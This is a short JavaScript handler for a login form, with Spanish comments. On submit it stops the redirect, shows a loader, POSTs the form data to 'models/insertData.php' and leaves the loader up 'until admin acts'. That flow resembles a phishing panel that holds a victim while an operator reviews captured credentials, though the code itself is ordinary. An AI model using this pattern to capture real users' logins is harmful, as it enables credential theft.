document.addEventListener("DOMContentLoaded", () => {
  const form = document.getElementById("loginForm");
  const loader = document.querySelector(".loader-overlay");

  form.addEventListener("submit", function (e) {
    e.preventDefault(); // Evita redirección

    loader.style.display = "flex"; // Muestra loader

    const formData = new FormData(form);

    fetch("models/insertData.php", {
      method: "POST",
      body: formData,
    })
      .then((response) => response.text())
      .then((data) => {
        console.log(data); // Aquí puedes decidir qué hacer con la respuesta, por ahora solo la dejamos logueada
        // Si quieres dejar el loader estático hasta que admin actúe, simplemente no haces nada más aquí
      })
      .catch((error) => {
        console.log("Error:", error);
      });
  });
});



